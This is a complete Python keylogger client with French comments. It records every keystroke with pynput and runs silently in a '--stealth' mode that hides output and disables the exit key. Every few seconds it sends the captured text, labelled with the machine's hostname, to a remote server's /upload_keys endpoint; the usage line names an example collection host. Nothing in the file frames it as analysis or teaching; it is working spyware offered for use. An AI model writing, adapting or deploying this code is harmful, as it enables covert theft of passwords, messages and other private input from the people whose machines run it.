#!/usr/bin/env python3
"""
Keylogger Client v2.2 - Compatible backend actuel

- Capture les frappes avec pynput
- Bufferise des événements structurés
- Reconstruit une chaîne "logs" avant envoi
- Envoie JSON : {"machine": ..., "logs": ...} + header X-API-Key
"""

import sys
import time
import socket
import subprocess

# Installation automatique des dépendances
try:
    from pynput import keyboard
    import requests
except ImportError:
    print("[!] Installation des dépendances (pynput, requests)...")
    try:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--break-system-packages", "-q", "pynput", "requests"
        ])
        from pynput import keyboard
        import requests
        print("[✓] Dépendances installées")
    except Exception as e:
        print(f"[✗] Erreur d'installation: {e}")
        print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests")
        sys.exit(1)


class KeyloggerClient:
    def __init__(self, server_url: str, api_key: str, stealth: bool = False):
        self.server_url = server_url.rstrip("/")
        self.api_key = api_key
        self.stealth = stealth

        # Buffer d'événements structurés : {"t": time, "k": "char"/"special", "v": valeur}
        self.buffer = []
        self.buffer_size = 50        # Nombre max d'événements avant envoi
        self.last_send = time.time()
        self.send_interval = 3       # Envoi max toutes les 3 secondes
        self.send_lock = False

        # Identifiant machine
        self.machine_id = socket.gethostname()

        if not self.stealth:
            print("[✓] Keylogger démarré")
            print(f"[✓] Machine : {self.machine_id}")
            print(f"[✓] Serveur : {self.server_url}")
            print(f"[✓] Mode    : {'Stealth' if stealth else 'Debug'}")

    # ------------------------------------------------------------------ #
    # ENVOI AU SERVEUR
    # ------------------------------------------------------------------ #
    def _events_to_logs(self, events):
        """
        Re-construit une chaîne 'logs' compatible avec le backend actuel.
        - char -> caractère directement
        - special BACKSPACE/DEL/ESC/... -> tag [NOM]
        """
        logs_str = ""
        for e in events:
            kind = e.get("k")
            value = e.get("v", "")
            if kind == "char":
                logs_str += value
            elif kind == "special":
                # mêmes conventions que pour le C++ (tags [ESC], [BACKSPACE], etc.)
                logs_str += f"[{value}]"
        return logs_str

    def send_keys(self):
        """Envoie le buffer d'événements au serveur (en 'logs')."""
        if not self.buffer or self.send_lock:
            return

        self.send_lock = True
        events_to_send = self.buffer
        self.buffer = []

        try:
            logs_str = self._events_to_logs(events_to_send)
            if not logs_str:
                # rien de concret à envoyer
                return

            payload = {
                "machine": self.machine_id,
                "logs": logs_str,
            }
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "KeyloggerClient/2.2",
                "X-API-Key": self.api_key,
            }

            resp = requests.post(
                f"{self.server_url}/upload_keys",
                json=payload,
                headers=headers,
                timeout=10,
            )

            if resp.status_code == 200:
                if not self.stealth:
                    print(f"\n[✓] {len(events_to_send)} événements envoyés")
            else:
                if not self.stealth:
                    print(f"\n[✗] Erreur serveur: HTTP {resp.status_code}")
                self.buffer = events_to_send + self.buffer

        except requests.exceptions.RequestException as e:
            if not self.stealth:
                print(f"\n[✗] Erreur de connexion: {e}")
            self.buffer = events_to_send + self.buffer

        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur inattendue pendant l'envoi: {e}")
            self.buffer = events_to_send + self.buffer

        finally:
            self.send_lock = False

    # ------------------------------------------------------------------ #
    # GESTION DU BUFFER
    # ------------------------------------------------------------------ #
    def _add_event(self, kind: str, value: str):
        """
        Ajoute un événement au buffer.
        kind: "char" ou "special"
        value: caractère ou nom de touche
        """
        evt = {
            "t": time.time(),
            "k": kind,
            "v": value,
        }
        self.buffer.append(evt)

        # Affichage console en mode debug
        if not self.stealth:
            if kind == "char":
                to_show = value
                if value == "\n":
                    to_show = "\\n"
                elif value == "\t":
                    to_show = "\\t"
                print(to_show, end="", flush=True)
            else:
                print(f"[{value}]", end="", flush=True)

        # Conditions d'envoi
        now = time.time()
        if len(self.buffer) >= self.buffer_size or (now - self.last_send) >= self.send_interval:
            self.send_keys()
            self.last_send = now

    # ------------------------------------------------------------------ #
    # CALLBACKS PYNPUT
    # ------------------------------------------------------------------ #
    def on_press(self, key):
        """Appelé à chaque pression de touche."""
        try:
            # Cas des caractères imprimables
            if hasattr(key, "char") and key.char is not None:
                self._add_event("char", key.char)
                return

            # Cas des touches spéciales
            key_name = str(key).replace("Key.", "")

            # Touches complètement ignorées
            ignore = {
                "shift", "shift_r", "shift_l",
                "ctrl", "ctrl_r", "ctrl_l",
                "alt", "alt_r", "alt_l", "alt_gr",
                "cmd", "cmd_r", "cmd_l",
                "caps_lock", "fn",
                "up", "down", "left", "right",
                "home", "end", "page_up", "page_down",
                "insert", "print_screen", "pause",
                "num_lock", "scroll_lock",
                "f1", "f2", "f3", "f4", "f5", "f6",
                "f7", "f8", "f9", "f10", "f11", "f12",
            }
            if key_name in ignore:
                return

            special_map = {
                "space": " ",
                "enter": "\n",
                "tab": "\t",
                "backspace": "BACKSPACE",
                "delete": "DEL",
                "esc": "ESC",
            }

            if key_name in special_map:
                mapped = special_map[key_name]
                if mapped in (" ", "\n", "\t"):
                    self._add_event("char", mapped)
                else:
                    self._add_event("special", mapped)
            else:
                self._add_event("special", key_name.upper())

        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur capture: {e}")

    def on_release(self, key):
        """Appelé au relâchement d'une touche."""
        if not self.stealth and key == keyboard.Key.esc:
            print("\n[!] Arrêt demandé (ESC)")
            return False

    # ------------------------------------------------------------------ #
    # BOUCLE PRINCIPALE
    # ------------------------------------------------------------------ #
    def start(self):
        """Démarre l'écoute du clavier."""
        if not self.stealth:
            print("[!] Appuyez sur ESC pour arrêter en mode debug")
            print("-" * 50)

        # Ping serveur (optionnel)
        try:
            r = requests.get(f"{self.server_url}/api/ping", timeout=5)
            if not self.stealth:
                if r.status_code == 200:
                    print("[✓] Connexion au serveur OK")
                else:
                    print(f"[!] Serveur répond avec code {r.status_code}")
        except Exception as e:
            if not self.stealth:
                print("[!] Impossible de joindre le serveur (buffer local)")
                print(f"    Erreur: {e}")

        # Démarrage de l'écoute
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

        # Envoi du reste
        if self.buffer:
            self.send_keys()


# ---------------------------------------------------------------------- #
# MAIN
# ---------------------------------------------------------------------- #
def main():
    if len(sys.argv) < 3:
        print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
        print("Exemple: python3 keylogger_client_v2.py https://api.keylog.claverie.site MON_API_KEY --stealth")
        sys.exit(1)

    server_url = sys.argv[1]
    api_key = sys.argv[2]
    stealth = "--stealth" in sys.argv

    try:
        client = KeyloggerClient(server_url, api_key, stealth)
        client.start()
    except KeyboardInterrupt:
        print("\n[!] Arrêt demandé (Ctrl+C)")
        sys.exit(0)
    except Exception as e:
        print(f"\n[✗] Erreur fatale: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()

